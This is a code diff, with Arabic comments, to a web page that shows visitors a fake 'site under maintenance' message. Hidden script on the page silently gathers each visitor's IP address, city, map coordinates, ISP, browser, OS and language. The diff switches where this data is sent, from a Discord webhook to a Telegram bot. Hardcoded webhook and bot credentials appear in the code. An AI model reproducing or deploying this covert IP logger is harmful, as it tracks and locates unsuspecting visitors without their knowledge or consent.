@@ -44,8 +44,9 @@
     <p>نعتذر عن الإزعاج. نحن نعمل على تحسين الموقع.</p>
   </div>
   <script>
-    // رابط الويب هوك لديسكورد
-    const webhookUrl = 'https://discord.com/api/webhooks/1281263004326826127/CwN2EjF6OfTMGkGlkvFPM7c4pjPyJGnpNEfSV1Vmgm3Y2GWidjX3yIWmlEhor_-ydyT-';
+    // مفتاح بوت Telegram ورقم القناة أو المجموعة
+    const botToken = '6611757234:AAEoATfcF8gD-9qLHQNGE48HVkmryBnVI4c';  // توكن البوت
+    const chatId = '1088226862';  // chat_id الخاص بالقناة أو المجموعة
 
     // دالة للحصول على البيانات من API
     function fetchData(url) {
@@ -78,40 +79,26 @@
       };
     }
 
-    // دالة لإرسال البيانات إلى ديسكورد
-    async function sendToDiscord(ipInfo, ipAddress, browserInfo) {
-      const payload = {
-        username: "IP Logger",
-        avatar_url: "https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png",
-        embeds: [
-          {
-            title: "تم تسجيل دخول جديد",
-            color: 5814783,
-            fields: [
-              { name: "عنوان IP", value: `\`${ipAddress}\``, inline: true },
-              { name: "الموقع", value: `${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}`, inline: true },
-              { name: "الإحداثيات", value: `[عرض على الخريطة](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})`, inline: true },
-              { name: "مزود الخدمة", value: ipInfo.isp || "غير معروف", inline: true },
-              { name: "التوقيت المحلي", value: ipInfo.timezone || "غير معروف", inline: true },
-              { name: "العملة", value: ipInfo.currency || "غير معروف", inline: true },
-              { name: "المتصفح", value: browserInfo["المتصفح"], inline: false },
-              { name: "النظام", value: browserInfo["النظام"], inline: true },
-              { name: "اللغة", value: browserInfo["اللغة"], inline: true },
-              { name: "المنطقة الزمنية", value: browserInfo["المنطقة الزمنية"], inline: true }
-            ],
-            footer: {
-              text: "IP Logger | للاستخدام التعليمي فقط",
-              icon_url: "https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png"
-            },
-            timestamp: new Date().toISOString()
-          }
-        ]
-      };
+    // دالة لإرسال البيانات إلى Telegram
+    async function sendToTelegram(ipInfo, ipAddress, browserInfo) {
+      const message = `
+      تم تسجيل دخول جديد:
+      عنوان IP: ${ipAddress}
+      الموقع: ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
+      الإحداثيات: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}
+      مزود الخدمة: ${ipInfo.isp || 'غير معروف'}
+      التوقيت المحلي: ${ipInfo.timezone || 'غير معروف'}
+      العملة: ${ipInfo.currency || 'غير معروف'}
+      المتصفح: ${browserInfo['المتصفح']}
+      النظام: ${browserInfo['النظام']}
+      اللغة: ${browserInfo['اللغة']}
+      المنطقة الزمنية: ${browserInfo['المنطقة الزمنية']}
+      `;
 
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
       const xhr = new XMLHttpRequest();
-      xhr.open("POST", webhookUrl);
-      xhr.setRequestHeader("Content-type", "application/json");
-      xhr.send(JSON.stringify(payload));
+      xhr.open("GET", url, true);
+      xhr.send();
     }
 
     // الدالة الرئيسية لجمع البيانات وإرسالها
@@ -124,8 +111,8 @@
         // جلب معلومات المتصفح والجهاز
         const browserInfo = getBrowserInfo();
 
-        // إرسال جميع البيانات إلى ديسكورد
-        sendToDiscord(ipInfo, ipAddress.query, browserInfo);
+        // إرسال جميع البيانات إلى Telegram
+        sendToTelegram(ipInfo, ipAddress.query, browserInfo);
       } catch (error) {
         console.error("خطأ أثناء جلب البيانات:", error);
       }
